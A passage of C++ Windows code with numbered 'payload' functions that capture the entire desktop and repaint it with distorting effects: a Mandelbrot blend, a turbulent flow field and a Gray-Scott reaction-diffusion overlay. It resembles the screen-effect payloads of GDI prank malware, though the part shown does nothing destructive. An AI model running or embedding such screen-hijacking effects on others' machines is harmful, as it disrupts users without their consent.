                    double ny = 2.0 * zx * zy + ci;
                    zx = nx;
                    zy = ny;
                    ++iter;
                }

                if (iter == 64)
                {
                    buf.pixels[y * w + x] = RGBPixel(0, 0, 0);
                    continue;
                }

                double f = iter / 64.0;
                int r = (int)(f * 255);
                int g = (int)((1.0 - f) * 200);
                int bl = (int)(255 - f * 150);

                uint32_t p = buf.pixels[y * w + x];
                int sr, sg, sb;
                SplitRGB(p, sr, sg, sb);

                (void)ox;
                (void)oy;

                sr = (int)(sr * 0.4 + r * 0.6);
                sg = (int)(sg * 0.4 + g * 0.6);
                sb = (int)(sb * 0.4 + bl * 0.6);

                buf.pixels[y * w + x] = RGBPixel(sr, sg, sb);
            }
        }

        BitBlt(dc, 0, 0, w, h, buf.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 62
// Turbulent flow field - pseudo-noise vector field advects a
// fading trace, hues shift along the flow.
// ============================================================

DWORD WINAPI GDIPayload62(LPVOID)
{
    const SeedVariant& sd = SeedGet(62);
    srand(SeedRand(62));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer a;
    GDIBuffer b;

    if (!CreateBuffer(dc, a, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, b, w, h))
    {
        DestroyBuffer(a);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const float step = 3.0f + sd.amp * 0.5f;
    const float freq = 0.008f + sd.amp * 0.001f;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float n =
                    sinf(x * freq + frame * 0.03f) *
                    cosf(y * freq - frame * 0.02f) +
                    sinf((x + y) * freq * 0.5f + sd.phase * 0.001f) * 0.6f;

                float angle = n * 6.2831853f;

                int sx = x + (int)(cosf(angle) * step);
                int sy = y + (int)(sinf(angle) * step);

                uint32_t p;

                if (sx >= 0 && sx < w && sy >= 0 && sy < h)
                    p = a.pixels[sy * w + sx];
                else
                    p = RGBPixel(0, 0, 0);

                int r, g, bl;
                SplitRGB(p, r, g, bl);

                float hueMul = (n * 0.5f + 0.5f);

                r = (int)(r * hueMul);
                g = (int)(g * (1.0f - hueMul * 0.5f));
                bl = (int)(bl * (0.5f + hueMul * 0.5f));

                b.pixels[y * w + x] = RGBPixel(r, g, bl);
            }
        }

        BitBlt(a.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);
        BitBlt(dc, 0, 0, w, h, b.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(b);
    DestroyBuffer(a);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 63
// Reaction - diffusion overlay (Gray-Scott) - simulates B-Z
// / Gray-Scott on a small grid and blends it over the capture.
// ============================================================

DWORD WINAPI GDIPayload63(LPVOID)
{
    const SeedVariant& sd = SeedGet(63);
    srand(SeedRand(63));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const int gw = 160;
    const int gh = 90;
    const int steps = 4;

    std::vector<float> U(gw * gh, 1.0f);
    std::vector<float> V(gw * gh, 0.0f);

    srand(SeedRand(63));

    const float DA = 1.0f;
    const float DB = 0.5f;
    const float feed = 0.055f + sd.amp * 0.002f;
    const float kill = 0.062f;

    const int cx0 = gw / 2;
    const int cy0 = gh / 2;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        for (int s = 0; s < steps; ++s)
        {
            for (int y = 1; y < gh - 1; ++y)
            {
                for (int x = 1; x < gw - 1; ++x)
                {
                    float u0 = U[y * gw + x];
                    float v0 = V[y * gw + x];

                    float s1 = -1.0f, s2 = 1.0f;

                    float lapU =
                        U[y * gw + (x + (int)s1)] +
                        U[y * gw + (x + (int)s2)] +
                        U[(y + (int)s1) * gw + x] +
                        U[(y + (int)s2) * gw + x] -
                        4.0f * u0;

                    float lapV =
                        V[y * gw + (x + (int)s1)] +
                        V[y * gw + (x + (int)s2)] +
                        V[(y + (int)s1) * gw + x] +
                        V[(y + (int)s2) * gw + x] -
                        4.0f * v0;

                    float reaction = u0 * v0 * v0;

                    float du = DA * lapU - reaction + feed * (1.0f - u0);
                    float dv = DB * lapV + reaction - (kill + feed) * v0;

                    U[y * gw + x] += du * 0.02f;
                    V[y * gw + x] += dv * 0.02f;
                }
            }

            int seedPts = 24;

            for (int i = 0; i < seedPts; ++i)
            {
                int px = cx0 + (rand() % 17) - 8;
                int py = cy0 + (rand() % 17) - 8;

                px = (px + gw) % gw;
                py = (py + gh) % gh;

                V[py * gw + px] = 1.0f;
            }
        }

        BitBlt(buf.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int gx = (x * gw) / w;
                int gy = (y * gh) / h;

                float v = V[gy * gw + gx];

                uint32_t p = buf.pixels[y * w + x];

                int r, g, bl;
                SplitRGB(p, r, g, bl);

                float over = 0.35f + v * 0.65f;

                r = (int)(r * (1.0f - over * 0.5f) + 200 * over * 0.5f);
                g = (int)(g * (1.0f - over * 0.5f) + (10 + v * 240) * over * 0.5f);
                bl = (int)(bl * (1.0f - over * 0.5f) + (30 + v * 60) * over * 0.5f);

                buf.pixels[y * w + x] = RGBPixel(r, g, bl);
            }
        }

        BitBlt(dc, 0, 0, w, h, buf.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}
